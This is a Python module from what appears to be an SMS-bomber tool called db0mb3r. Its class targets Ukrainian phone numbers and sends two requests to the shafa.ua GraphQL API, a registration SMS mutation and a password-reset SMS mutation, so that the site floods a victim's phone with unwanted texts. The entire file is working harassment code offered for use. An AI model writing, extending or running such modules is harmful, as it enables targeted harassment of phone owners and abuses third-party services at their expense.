from db0mb3r.services.service import Service


class Shafa(Service):
    phone_codes = [380]

    async def run(self):
        await self.post(
            "https://shafa.ua/api/v3/graphiql",
            json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + self.formatted_phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },
        )

        await self.post(
            "https://shafa.ua/api/v3/graphiql",
            json={
                "operationName": "sendResetPasswordSms",
                "variables": {"phoneNumber": "+" + self.formatted_phone},
                "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n",
            },
        )
